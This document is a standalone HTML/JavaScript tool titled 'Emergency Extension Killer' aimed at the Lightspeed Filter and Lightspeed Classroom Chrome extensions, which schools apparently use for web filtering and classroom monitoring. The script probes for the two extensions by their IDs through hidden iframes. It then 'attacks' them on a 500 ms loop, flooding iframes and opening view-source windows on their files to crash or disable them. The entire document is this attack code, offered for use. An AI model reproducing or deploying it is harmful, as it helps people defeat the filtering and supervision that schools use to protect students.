<!DOCTYPE html>
<html>
<head>
    <title>EMERGENCY EXTENSION DISABLER</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #111;
            color: #fff;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        #container {
            max-width: 800px;
            margin: 0 auto;
            background-color: #222;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px #f00;
        }
        h1 {
            color: #f00;
            text-shadow: 0 0 10px #f00;
        }
        button {
            background: #f00;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            margin: 10px;
            cursor: pointer;
            border-radius: 5px;
            font-weight: bold;
        }
        button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        #status {
            margin: 20px 0;
            padding: 10px;
            background: #333;
            border-radius: 5px;
            font-family: monospace;
        }
        #log {
            height: 200px;
            overflow-y: scroll;
            background: #000;
            padding: 10px;
            text-align: left;
            font-family: monospace;
            border: 1px solid #f00;
        }
        .target {
            display: flex;
            justify-content: space-between;
            padding: 10px;
            margin: 5px 0;
            background: #1a1a1a;
            border-radius: 5px;
        }
        .target-name {
            font-weight: bold;
        }
        .target-status {
            padding: 3px 10px;
            border-radius: 3px;
        }
        .detected {
            background: #0a0;
        }
        .missing {
            background: #a00;
        }
        .attacking {
            background: #f00;
            animation: pulse 0.5s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>EMERGENCY EXTENSION KILLER</h1>
        
        <div id="targets">
            <div class="target" id="target-filter">
                <span class="target-name">Lightspeed Filter</span>
                <span class="target-status missing" id="status-filter">CHECKING...</span>
            </div>
            <div class="target" id="target-classroom">
                <span class="target-name">Lightspeed Classroom</span>
                <span class="target-status missing" id="status-classroom">CHECKING...</span>
            </div>
        </div>
        
        <div id="status">Initializing system...</div>
        
        <button id="killButton" disabled>KILL EXTENSIONS</button>
        
        <div id="log"></div>
    </div>

    <script>
        // TARGET EXTENSIONS
        const TARGETS = {
            filter: {
                id: 'adkcpkpghahmbopkjchobieckeoaoeem',
                name: 'Lightspeed Filter',
                detected: false
            },
            classroom: {
                id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
                name: 'Lightspeed Classroom',
                detected: false
            }
        };

        // SYSTEM VARIABLES
        let isAttacking = false;
        let attackInterval;
        const killButton = document.getElementById('killButton');
        const statusEl = document.getElementById('status');
        const logEl = document.getElementById('log');

        // LOG MESSAGES
        function log(message) {
            const timestamp = new Date().toLocaleTimeString();
            logEl.innerHTML += `[${timestamp}] ${message}<br>`;
            logEl.scrollTop = logEl.scrollHeight;
        }

        // UPDATE STATUS
        function updateStatus(message) {
            statusEl.textContent = message;
        }

        // CHECK IF EXTENSION EXISTS
        function checkExtension(target) {
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                iframe.src = `chrome-extension://${target.id}/manifest.json`;
                iframe.style.display = 'none';
                
                iframe.onload = function() {
                    iframe.remove();
                    resolve(true);
                };
                
                iframe.onerror = function() {
                    iframe.remove();
                    resolve(false);
                };
                
                setTimeout(() => {
                    iframe.remove();
                    resolve(false);
                }, 2000);
                
                document.body.appendChild(iframe);
            });
        }

        // DETECT ALL EXTENSIONS
        async function detectExtensions() {
            let allDetected = true;
            
            for (const [key, target] of Object.entries(TARGETS)) {
                target.detected = await checkExtension(target);
                updateTargetStatus(key, target.detected ? 'detected' : 'missing');
                
                if (!target.detected) allDetected = false;
            }
            
            if (allDetected) {
                killButton.disabled = false;
                updateStatus('READY: Both targets detected');
                log('SYSTEM READY - Both target extensions detected');
            } else {
                killButton.disabled = true;
                updateStatus('ERROR: Missing required extensions');
                log('ERROR: One or more target extensions not detected');
            }
            
            return allDetected;
        }

        // UPDATE TARGET STATUS DISPLAY
        function updateTargetStatus(targetKey, status) {
            const statusEl = document.getElementById(`status-${targetKey}`);
            statusEl.textContent = status.toUpperCase();
            statusEl.className = `target-status ${status}`;
            
            if (status === 'detected') {
                TARGETS[targetKey].detected = true;
            } else {
                TARGETS[targetKey].detected = false;
            }
        }

        // ATTACK AN EXTENSION
        function attackExtension(target) {
            try {
                // METHOD 1: IFRAME FLOOD
                for (let i = 0; i < 50; i++) {
                    const iframe = document.createElement('iframe');
                    iframe.src = `chrome-extension://${target.id}/main.js`;
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    setTimeout(() => iframe.remove(), 100);
                }
                
                // METHOD 2: VIEW-SOURCE ATTACK
                const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, '_blank');
                setTimeout(() => win && win.close(), 100);
                
                return true;
            } catch (e) {
                return false;
            }
        }

        // START ATTACKING ALL TARGETS
        function startAttack() {
            if (isAttacking) return;
            
            isAttacking = true;
            killButton.disabled = true;
            updateStatus('ATTACKING EXTENSIONS...');
            log('STARTING EMERGENCY ATTACK SEQUENCE');
            
            // Update UI to show attacking status
            for (const key of Object.keys(TARGETS)) {
                if (TARGETS[key].detected) {
                    document.getElementById(`status-${key}`).className = 'target-status attacking';
                    document.getElementById(`status-${key}`).textContent = 'ATTACKING';
                }
            }
            
            // Immediate first attack
            attackAllExtensions();
            
            // Continuous attacks
            attackInterval = setInterval(attackAllExtensions, 500);
        }

        // ATTACK ALL DETECTED EXTENSIONS
        function attackAllExtensions() {
            let anySuccess = false;
            
            for (const [key, target] of Object.entries(TARGETS)) {
                if (target.detected) {
                    const success = attackExtension(target);
                    if (success) anySuccess = true;
                    log(`${target.name}: ${success ? 'Attack succeeded' : 'Attack failed'}`);
                }
            }
            
            // If no extensions could be attacked, stop
            if (!anySuccess) {
                stopAttack();
                updateStatus('ATTACK FAILED: Extensions not responding');
                log('ATTACK FAILED: No extensions could be attacked');
            }
        }

        // STOP ATTACKING
        function stopAttack() {
            clearInterval(attackInterval);
            isAttacking = false;
            killButton.disabled = false;
            
            // Reset status displays
            for (const [key, target] of Object.entries(TARGETS)) {
                if (target.detected) {
                    document.getElementById(`status-${key}`).className = 'target-status detected';
                    document.getElementById(`status-${key}`).textContent = 'DETECTED';
                }
            }
            
            updateStatus('ATTACK STOPPED');
            log('ATTACK SEQUENCE TERMINATED');
        }

        // INITIALIZE SYSTEM
        async function initialize() {
            log('Initializing emergency disabler...');
            updateStatus('DETECTING EXTENSIONS...');
            
            // Initial detection
            await detectExtensions();
            
            // Periodic re-check
            setInterval(detectExtensions, 10000);
        }

        // EVENT LISTENERS
        killButton.addEventListener('click', startAttack);
        
        // START SYSTEM
        document.addEventListener('DOMContentLoaded', initialize);
    </script>
</body>
</html>
